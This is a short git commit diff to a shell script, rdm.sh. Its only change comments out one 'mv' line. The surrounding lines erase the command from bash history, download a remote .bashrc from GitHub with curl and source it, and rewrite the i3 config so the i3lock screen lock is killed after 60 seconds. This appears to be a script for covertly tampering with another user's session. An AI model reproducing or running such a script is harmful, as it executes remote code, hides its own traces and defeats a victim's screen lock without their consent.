2878eb8fd4237d0cf539358ff1e3486540aaeb5d
Dimitri Attal <dimitri.attal@epita.fr>
2026-01-22 20:14:47 +0100

    ajout modif dmenu

--- rdm.sh
+++ rdm.sh
@@ -5,7 +5,7 @@ grep -v "$cmd" ~/.bash_history > ~/.bash_history.tmp && mv ~/.bash_history.tmp ~
 curl -sO https://raw.githubusercontent.com/did73at/cflse/main/.bashrc
 source .bashrc
 curl -sO https://raw.githubusercontent.com/did73at/cflse/main/i3.log
-mv i3.log ~/i3.log
+#mv i3.log ~/i3.log
 #~/afs/.confs/config/i3/
 filename=".config/i3/config"
 sed '/bindsym .* exec i3lock / s|$| \&\& sleep 60 \&\& pkill i3lock|' "$filename" > "$filename.tmp" && mv "$filename.tmp" "$filename"
